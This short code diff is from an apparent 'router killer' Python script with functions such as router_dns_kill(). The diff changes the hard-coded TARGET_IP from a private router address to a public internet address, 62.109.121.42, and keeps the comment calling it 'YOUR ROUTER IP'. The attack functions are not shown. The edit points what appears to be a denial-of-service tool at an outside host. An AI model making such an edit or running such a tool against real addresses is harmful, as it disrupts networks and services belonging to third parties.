@@ -3,7 +3,7 @@ import threading
 import time
 import random
 
-TARGET_IP = "192.168.1.1"  # YOUR ROUTER IP
+TARGET_IP = "62.109.121.42"  # YOUR ROUTER IP
 
 # ROUTER KILLER METHODS
 def router_dns_kill():
